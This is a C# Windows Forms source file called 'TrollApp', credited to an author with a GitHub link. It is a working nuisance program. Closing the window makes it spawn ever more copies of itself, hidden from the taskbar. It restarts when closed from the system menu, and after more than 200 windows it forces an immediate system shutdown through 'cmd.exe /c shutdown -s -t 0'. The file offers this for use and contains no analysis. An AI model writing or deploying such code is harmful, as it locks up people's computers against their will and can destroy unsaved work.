namespace TrollApp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
        }
        
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
            int sayi = Application.OpenForms.Count;
            sayi = sayi * 2;
            for (int i = 0; i < sayi; i++)
            {
                Form1 frm = new Form1();
                if(sayi > 200)
                {
                    System.Diagnostics.Process.Start("cmd.exe", "/c shutdown -s -t 0");
                }
                frm.Show();
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x112)
            {
                if (m.WParam.ToInt32() == 0xF060)
                {
                    Application.Restart();
                }
            }
            base.WndProc(ref m);
        }
        
    }
}

// Yapımcı: ByCan
// Github: github.com/fastuptime